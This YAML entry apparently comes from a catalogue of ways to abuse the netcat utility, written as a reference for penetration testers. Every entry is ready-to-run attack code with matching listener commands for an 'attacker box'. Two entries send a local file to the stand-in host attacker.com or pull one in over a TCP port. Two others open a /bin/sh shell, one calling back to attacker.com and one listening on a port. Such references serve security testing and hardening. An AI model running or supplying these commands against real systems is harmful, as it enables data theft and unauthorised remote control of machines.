---
functions:
  upload:
    - description: |
        Send a file to a TCP port. Run `nc -l -p 12345 > "where_to_save"` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  download:
    - description: Fetch remote file from a remote TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
      code: |-
        LPORT=12345
        LFILE=where_to_save
        nc -l -p $LPORT > "$LFILE"
  reverse-shell-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        nc -e /bin/sh $RHOST $RPORT
  bind-shell-interactive:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        nc -l -p $LPORT -e /bin/sh
---
